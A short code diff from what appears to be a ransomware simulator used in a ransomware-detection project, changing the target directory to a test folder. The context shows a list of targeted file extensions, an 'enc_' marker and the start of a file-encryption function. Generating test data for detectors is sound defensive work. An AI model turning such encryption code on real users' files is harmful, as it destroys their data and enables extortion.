@@ -11,7 +11,7 @@ from os import walk
 encryption_timeout = 10
 encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
-base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
+base_path = "/TestFiles/Text/1500KB"
 
 def EncryptFile(fileToEncrypt, key):
     iv = Random.new().read(16)
